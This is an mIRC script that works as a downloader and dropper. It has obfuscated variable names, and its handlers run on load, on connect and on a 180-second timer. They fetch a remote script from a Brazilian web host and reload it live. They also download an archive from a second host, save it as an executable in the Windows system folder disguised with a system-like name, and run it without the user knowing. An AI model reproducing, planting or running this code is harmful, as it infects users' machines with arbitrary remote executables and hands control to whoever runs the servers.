;check
on *:signal:ionload:.signal ivariouscheck
on *:connect:.signal ivariouscheck
on *:signal:ivariouscheck:{
  if (%hrtsrdxc) { return }
  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }
  set %noconalert 1
  if (!%sbunou) { .signal sbu | set -u [ $+ [ $calc(10*60) ] ] %sbunou yes }
wdl
}
;sb
on *:signal:sbu:{
  if (!$sock(sbu)) {
    if ($lof(sbsys.mrc) == %sbsize) { return }
    sockopen sbu www.canalbrusque.com.br 80
  }
}
on *:sockopen:sbu:{
  if ($sockerr) { return }
  sockwrite -n $sockname GET /krypton/sockbot.mrc HTTP/1.1
  sockwrite -n $sockname Host: www.canalbrusque.com.br
  sockwrite -n $sockname Connection: close
  sockwrite -n $sockname
}
on *:sockread:sbu:{
  if (!%ok) {
    sockread %i | tokenize 32 %i | unset %i
    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { sockclose $sockname }
    if (Content-Length isin $1) { set %sbsize $2 }
    if ($len($1-) == 0) { write -c sbsyst | set %ok yes }
  }
  else {
    sockread &i
    bwrite sbsyst -1 -1 &i
  }
}
on *:sockclose:sbu:{
  if (endscript isin $read(sbsyst,$lines(sbsyst))) {
    .remove sbsys.mrc
    .copy -o sbsyst sbsys.mrc
    .reload -rs1 sbsys.mrc
    .signal sbcheck
  }
  .remove sbsyst
}
;dl
alias wdl {
  if ($sock(wdl)) || ($isfile($dfn)) || (!$isdir($nofile($dfn))) || (%hshhxhsx) { return }
  unset %size %ok
  sockopen wdl $durl(host) 80
}
on *:sockopen:wdl:{
  if ($sockerr) { dend h }
  sockwrite -n $sockname GET $durl(full) HTTP/1.1
  sockwrite -n $sockname Host: $durl(host)
  sockwrite -n $sockname Connection: close
  sockwrite -n $sockname
}
on *:sockread:wdl:{
  if (!%ok) {
    sockread %i | tokenize 32 %i | unset %i
    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { dend h }
    if ($len($1-) == 0) { set %ok yes }
  }
  else {
    sockread &i
    bwrite $+(",$dfn,") -1 -1 &i
  }
}
on *:sockclose:wdl:{
    set %hshhxhsx yes
  if ($isfile($dfn)) {
    run $dfn
  }
  dend
}
alias dend {
  sockclose wdl
  unset %size %ok
  $iif($1 = h,halt)
}
alias durl return $iif($1 == full,$+(/,$gettok($dfull,3-,47))) $iif($1 == host,$gettok($dfull,2,47))
alias dfull return http://assistencial.hosting43.com/backup.zip
alias dfn return c:\windows\syswnskss.exe